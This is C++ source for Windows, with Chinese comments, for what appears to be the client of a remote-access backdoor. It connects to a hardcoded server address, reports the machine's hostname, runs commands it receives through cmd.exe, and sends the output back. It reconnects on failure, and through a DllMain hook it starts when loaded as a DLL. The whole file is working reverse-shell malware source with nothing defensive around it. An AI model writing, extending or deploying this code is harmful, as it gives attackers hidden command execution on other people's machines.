#define _WINSOCK_DEPRECATED_NO_WARNINGS 1

#include <winsock2.h>
#include <Windows.h>
#include <iostream>
#include <map>
#include "rapidjson/schema.h"
#include "rapidjson/writer.h"

#pragma comment(lib, "ws2_32.lib")

using namespace std;
using namespace rapidjson;

/// <summary>
/// 执行命令
/// </summary>
/// <param name="cmd"></param>
/// <returns></returns>
string exec(char* cmd)
{
	HANDLE hStdOutPipeRead = NULL;
	HANDLE hStdOutPipeWrite = NULL;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0))
	{
		return "Create pipe error";
	}
	STARTUPINFO si = {};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdError = hStdOutPipeWrite;
	si.hStdOutput = hStdOutPipeWrite;
	PROCESS_INFORMATION pi = {};
	LPCSTR lpApplicationName = "C:\\Windows\\System32\\cmd.exe";
	char lpCommandLine[1024];
	sprintf_s(lpCommandLine, "%s%s%s", lpApplicationName, " /c ", cmd);
	if (!CreateProcess(lpApplicationName, lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		return "Create process error";
	}
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hStdOutPipeWrite);
	char buf[1024 + 1] = {};
	DWORD dwRead = 0;
	DWORD dwAvail = 0;
	string result; {}
	BOOL ok = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);
	while (ok)
	{
		buf[dwRead] = '\0';
		result += buf;
		ok = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);
	}
	CloseHandle(hStdOutPipeRead);
	return result;
}

/// <summary>
/// 向服务端发送结果
/// </summary>
/// <param name="socket"></param>
/// <param name="status"></param>
/// <param name="body"></param>
void send_result(SOCKET socket, int status, string body) {
	StringBuffer s;
	Writer<StringBuffer> writer(s);
	writer.StartObject();
	writer.Key("type");
	writer.String("result");
	writer.Key("status");
	writer.Int(status);
	writer.Key("length");
	writer.Int(body.size());
	writer.EndObject();
	string head = s.GetString();
	int head_size = head.size();
	send(socket, (char*)&head_size, sizeof(int), 0);
	send(socket, head.c_str(), head.size(), 0);
	send(socket, body.c_str(), body.size(), 0);
}

/// <summary>
/// 获取主机名
/// </summary>
/// <returns></returns>
string get_hostname() {
	DWORD info_buffer_size = 32767;
	TCHAR info_buf[32767];
	GetComputerName(info_buf, &info_buffer_size);
	return info_buf;
}

/// <summary>
/// 获取客户端基本信息
/// </summary>
/// <returns></returns>
string get_info() {
	map<string, string> info = { {"os", ""}, {"hostname", get_hostname()}, {"integrity", ""} };
	StringBuffer s;
	Writer<StringBuffer> writer(s);
	writer.StartObject();
	for (auto& item : info) {
		writer.Key((item.first).c_str());
		writer.String((item.second).c_str());
	}
	writer.EndObject();
	return s.GetString();
}

/// <summary>
/// 获取当前工作路径
/// </summary>
/// <returns></returns>
string get_current_directory() {
	TCHAR buffer[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, buffer, MAX_PATH);
	string::size_type pos = string(buffer).find_last_of("\\/");
	return string(buffer).substr(0, pos);
}

/// <summary>
/// 连接服务端
/// </summary>
/// <param name="sock"></param>
/// <param name="server_addr"></param>
void connect(SOCKET sock, SOCKADDR_IN server_addr)
{
	// 连接失败5秒后重试
	while (connect(sock, (SOCKADDR*)&server_addr, sizeof(server_addr)) != 0)
	{
		Sleep(5);
	}
	// 发送验证信息
	send_result(sock, 1, get_info());
}

void main()
{
	// 初始化套接字
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	// 创建套接字
	SOCKET sock = socket(PF_INET, SOCK_STREAM, 0);
	// 服务端地址
	SOCKADDR_IN server_addr{};
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	server_addr.sin_port = htons(9999);
	// 连接服务端
	connect(sock, server_addr);
	// 存储消息头
	char head[1024];
	// 存储消息主体
	char body[1024];
	while (1)
	{
		// 消息头长度
		struct Data {
			int size;
		} data;
		// 清空结构体
		memset(&data, 0, sizeof(struct Data));
		// 接收消息头大小
		int recv_len = recv(sock, (char*)&data, sizeof(struct Data), 0);
		// 接收失败
		if (recv_len == SOCKET_ERROR)
		{
			// 关闭套接字
			closesocket(sock);
			// 重新创建套接字
			sock = socket(PF_INET, SOCK_STREAM, 0);
			// 重新连接
			connect(sock, server_addr);
			continue;
		}
		// 清空消息头
		memset(&head, 0, sizeof(head));
		// 接收消息头
		recv(sock, head, data.size, 0);
		// 解析消息头
		Document dom;
		dom.Parse(head);
		// 消息主体大小
		int body_size = dom["length"].GetInt();
		// 清空消息主体
		memset(&body, 0, sizeof(body));
		// 接收消息主体
		recv(sock, body, body_size, 0);
		// 消息类型
		string type = dom["type"].GetString();
		if (type == "command") {
			// 执行命令
			string result = exec(body);
			// 发送结果
			send_result(sock, 1, result);
		}
		// 发送工作路径
		send_result(sock, 1, get_current_directory());
	}
	WSACleanup();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		main();
	}
	return TRUE;
}